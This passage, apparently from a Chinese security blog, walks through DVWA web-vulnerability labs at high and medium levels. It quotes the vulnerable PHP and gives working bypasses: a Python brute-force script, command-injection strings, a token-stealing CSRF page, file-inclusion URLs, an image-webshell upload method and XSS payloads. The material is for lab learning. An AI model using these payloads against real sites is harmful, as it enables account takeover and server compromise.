$result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 服务器端代码加入了Token来抵御CSRF攻击以及无脑爆破，同时加入了mysqli_real_escape_string以及stripslashes函数来防止sql注入 anti-CSRF Token的原理是当用户访问时，生成一个随机的token，每当用户提交时，在服务器端比对一下token值是否正确 虽然加入了防爆破机制，但也只是防止了bp的无脑爆破，可以通过Python脚本来爆破，下面贴一个网上来找来的pyton脚本 from bs4 import BeautifulSoup import urllib2 header={ ‘Host’: ‘192.168.153.130’, ‘Cache-Control’: ‘max-age=0’, ‘If-None-Match’: “307-52156c6a290c0”, ‘If-Modified-Since’: ‘Mon, 05 Oct 2015 07:51:07 GMT’, ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36’, ‘Accept’: ‘/‘, ‘Referer’: ‘http://192.168.153.130/dvwa/vulnerabilities/brute/index.php&#39;, ‘Accept-Encoding’: ‘gzip, deflate, sdch’, ‘Accept-Language’: ‘zh-CN,zh;q=0.8’, ‘Cookie’: ‘security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2’}requrl = “http://192.168.153.130/dvwa/vulnerabilities/brute/&quot; def get_token(requrl,header): req = urllib2.Request(url=requrl,headers=header) response = urllib2.urlopen(req) print response.getcode(), the_page = response.read() print len(the_page) soup = BeautifulSoup(the_page,”html.parser”) user_token = soup.form.input.input.input.input[“value”] #get the user_token return user_tokenuser_token = get_token(requrl,header) i=0 for line in open(“rkolin.txt”): requrl = “http://192.168.153.130/dvwa/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i = i+1 print i,’admin’,line.strip(), user_token = get_token(requrl,header) if (i == 10): break Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = trim($_REQUEST[ &apos;ip&apos; ]); // 设置黑名单 $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 服务器端设置了黑名单，将非法的字符删除为空字符 看似过滤了所有的非法字符，但是实际上是把’| ‘替换为空字符，而服务器执行命令时是自上而下执行的，所以把管道符改为||时，比如127.0.0.1 || net user，服务器从上往下，删除掉一个’| ‘后，原来的命令就变为127.0.0.1 | net user，结果还是一样的 当然直接用127.0.0.1|net user，也可以绕过 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 检查Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 由于加入了Anti-CSRF token机制，所以当我们要攻击时，就必须先获取token 构造html页面： &lt;script type=&quot;text/javascript&quot;&gt; function attack() { document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value; document.getElementById(&quot;transfer&quot;).submit(); } &lt;/script&gt; &lt;iframe src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt; &lt;/iframe&gt; &lt;body onload=&quot;attack()&quot;&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/body&gt; 当受害者访问这个页面时，脚本会在后台访问修改密码的页面，获取页面中的token，并向服务器发送修改密码的请求 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数 $file = $_GET[ &apos;page&apos; ]; // 输入检查 if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // 当输入的参数有误时 echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; fnmatch() 函数根据指定的模式来匹配文件名或字符串。 服务器端加入了检测机制，输入的page参数必须带有file才能包含 我们可以利用file协议绕过，当浏览器访问一个本地的文件时，封装的协议就是file://构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=file:///D:\\phpStudy\\WWW\\phpinfo.phppage后面跟的参数为想要访问的文件的绝对路径 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件信息 $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // 检查是否为img if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // 文件夹是否能移动到新位置 if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // 不能 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // 图片不是Img时 echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; getimagesize() 函数用于获取图像大小及相关信息 每种格式的图片都会有各种的特征，getimagesize函数就是用于检查上传的图片是否有规定的特征 然而上传的jpg和png文件不像gif那样，直接在最前面添加一个gif89a就能绕过，所以我们需要制作一个图片木马 制作方法： cmd输入:copy 图片.jpg/b+木马.php/a 图片木马.jpg 将图片.jpg和木马.php合并并保存为图片木马.jpg 上传到服务器之后用菜刀之类的工具连接 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); if ( $resp || ( $_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos; &amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos; ) ){ // 验证成功，检查两次输入的密码是否一致 if ($pass_new == $pass_conf) { $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } else { // 验证码验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 验证的逻辑就是当参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，认为输入错误 直接用bp抓包，将User-Agent值改为于reCAPTCHA，并在参数栏里加一个recaptcha_response_field=hidd3n_valu3即可 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_SESSION [ &apos;id&apos; ] ) ) { // 获取输入的值 $id = $_SESSION[ &apos;id&apos; ]; // 连接数据库，并将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) { // 获取值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器在查询数据时加入了LIMIT 1，只输出一条结果 由于没有过滤注释符，所以只要在参数后面加一个#就可以绕过，或者是将or前面的值改为0，即查不到这个id，那服务器就会把or后面的值作为输出 high级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_COOKIE[ &apos;id&apos; ] ) ) { // 获取输入的值 $id = $_COOKIE[ &apos;id&apos; ]; // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 打乱Sleep函数的沉睡时间 if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // 没有找到用户，返回错误 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 反馈给用户 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到，服务器利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep，其结果是扰乱了时间盲注 既然时间盲注用不了，那就用布尔盲注就好 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { if (!isset ($_SESSION[&apos;last_session_id_high&apos;])) { $_SESSION[&apos;last_session_id_high&apos;] = 0; } $_SESSION[&apos;last_session_id_high&apos;]++; $cookie_value = md5($_SESSION[&apos;last_session_id_high&apos;]); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&apos;HTTP_HOST&apos;], false, false); } ?&gt; 这里将cookie的值进行了md5打散，并且还设置了期限之类进一步增加SessionID的安全性，但不足的是进行md5散列的值是0的累加，只要收集大量的SessionID，把SessionID拿去md5解密之后就能找到其规律 之后的步骤同Low XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { # 设置白名单 switch ($_GET[&apos;default&apos;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 虽然设置了白名单，但是没有过滤注释符，跟medium一样，加入#就行http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English#default==English%20%3Cscript%3Ealert(/xss/)%3C/script%3E XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 获取输入的值 $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; preg_replace函数执行一个正则表达式的搜索和替换 服务器加入了黑名单过滤输入，防御了双写和大小写绕过 虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。输入&lt;img src=1 onerror=alert(/xss/)&gt;即可弹窗 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // 获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 跟反射型一样，虽然用正则表达式过滤了&lt;script&gt;标签，但是没有img、iframe等其它标签 用bp抓包，改name的参数为&lt;img src=1 onerror=alert(1)&gt;即可弹窗","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"基于DVWA的web漏洞原理-medium","slug":"dvwa-medium","date":"2018-07-07T05:42:47.016Z","updated":"2018-07-13T12:17:58.134Z","comments":true,"path":"2018/07/07/dvwa-medium/","link":"","permalink":"https://perfect.xyz/2018/07/07/dvwa-medium/","excerpt":"low完了就很快了","text":"low完了就很快了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 去掉输入的用户名中的特殊字符 $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 去掉输入的密码中的特殊字符 $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取用户的详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 服务器端在low的基础上增加了mysql_real_escape_string()函数，这个函数可以对字符串中的特殊符号进行转义，基本上抵御了sql注入 当然这种抵御方式也不是万能的，通过构造编码也可以绕过 详情请见：http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html 同时$pass也做了md5校验，杜绝了password注入 虽然加入了防爆破机制(sleep(2))，但是2秒的沉睡并不算什么 直接用bp爆破就好了 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 设置黑名单 $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 跟low相比也只多了将&amp;&amp;和;这两个字符过滤掉，继续用||命令就好了 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 检查请求来自哪里 if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 两次输入的密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // 不是可信任的来源 echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; stripos(string,find,start) 查找find在string中出现的位置，没有找到则返回false 服务器想通过检查http包头的Referer参数的值中有没有要访问的主机名来抵御CSRF攻击Referer主要用来让服务器判断来源页面 逻辑是判断Referer参数中有没有目的主机的名，而Referer参数中会把完整的域名写进去，所以绕过的方法很简单，只要攻击者把攻击页面的名字改为目的主机的主机名即可绕过 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数值 $file = $_GET[ &apos;page&apos; ]; // 输入检查 $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 可以看见多了一个输入检查，利用str_replace函数讲page的值中的http:\\\\等字符删除但是str_replace这个本身就是有漏洞的，只要重写就可以绕过，比如http:\\\\写成hthttp://tp://，str_replace函数只会删除一个http:\\\\ 其他操作都与low的文件包含一样 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件信息 $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // 检查是否为img if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // 文件夹是否能移动到新位置 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // 图片不是Img时 echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 可以看到，服务器对文件的类型和大小进行了限制，但是只检查了Content-Ytpy这个字段只要用bp抓包，把这个字段的值改为image/png就可以绕过了 也可以利用文件包含的，不管是不是php文件，都会尝试当做php来执行的特性 用工具来包含我们上传的png文件，当然文件的内容是一句话木马 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); // 验证是否成功 if( !$resp ) { // 验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 验证成功，检查两次输入的密码是否一致 if( $pass_new == $pass_conf ) { // 显示下一阶段 echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;passed_captcha\\&quot; value=\\&quot;true\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查是否做了第一阶段 if( !$_POST[ &apos;passed_captcha&apos; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; 